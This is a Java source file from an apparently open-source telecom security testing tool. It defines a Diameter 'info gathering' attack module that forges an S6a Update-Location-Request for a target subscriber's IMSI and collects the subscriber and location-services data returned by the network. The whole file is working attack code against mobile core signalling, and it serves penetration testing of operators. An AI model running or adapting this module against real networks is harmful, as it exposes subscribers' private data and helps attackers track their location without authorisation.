/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.diameter.usecases.attacks.infogathering;

import com.rodan.intruder.diameter.usecases.attacks.DiameterModuleTemplate;
import com.rodan.intruder.diameter.usecases.model.DiameterModuleConstants;
import com.rodan.intruder.diameter.usecases.model.infogathering.SubscriberInfoOptions;
import com.rodan.intruder.diameter.usecases.model.infogathering.SubscriberInfoResponse;
import com.rodan.intruder.diameter.usecases.port.DiameterGateway;
import com.rodan.intruder.diameter.entities.event.model.UpdateLocationAnswer;
import com.rodan.intruder.diameter.entities.payload.s6a.UlrPayload;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import com.rodan.intruder.diameter.entities.event.S6aListener;
import com.rodan.intruder.diameter.usecases.model.DiameterModuleOptions;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = DiameterModuleConstants.SUBSCRIBER_INFO_NAME, category = DiameterModuleConstants.INFO_GATHERING_CATEGORY_DISPLAY_NAME,
        displayName = DiameterModuleConstants.SUBSCRIBER_INFO_DISPLAY_NAME, brief = DiameterModuleConstants.SUBSCRIBER_INFO_BRIEF,
        description = DiameterModuleConstants.SUBSCRIBER_INFO_DESCRIPTION, rank = DiameterModuleConstants.SUBSCRIBER_INFO_RANK,
        mainPayload = Constants.ULR_PAYLOAD_NAME)
public class SubscriberInfoModule extends DiameterModuleTemplate implements SignalingModule, S6aListener {
    final static Logger logger = LogManager.getLogger(SubscriberInfoModule.class);

    @Builder
    public SubscriberInfoModule(DiameterGateway gateway, DiameterModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (SubscriberInfoOptions) moduleOptions;
        var payload = UlrPayload.builder()
                .destinationRealm(options.getDestinationRealm())
                .imsi(options.getImsi()).mcc(options.getMcc()).mnc(options.getMnc())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        getGateway().addS6aListener(this);
    }

    @Override
    protected void cleanup() throws SystemException {
        if (this.getGateway() != null)
            this.getGateway().removeS6aListener(this);
    }

    @Override
    public void doUpdateLocationAnswerEvent(UpdateLocationAnswer answer) {
        logger.debug("[[[[ doUpdateLocationAnswerEvent ]]]]");
        logger.debug(answer);
        moduleResponse = SubscriberInfoResponse.builder()
                .subscriberInfo(answer.getSubscriberInfo()).lcsInfo(answer.getLcsInfo())
                .build();
        setResultReceived(true);
        logger.debug("ULR completed!");
    }
}
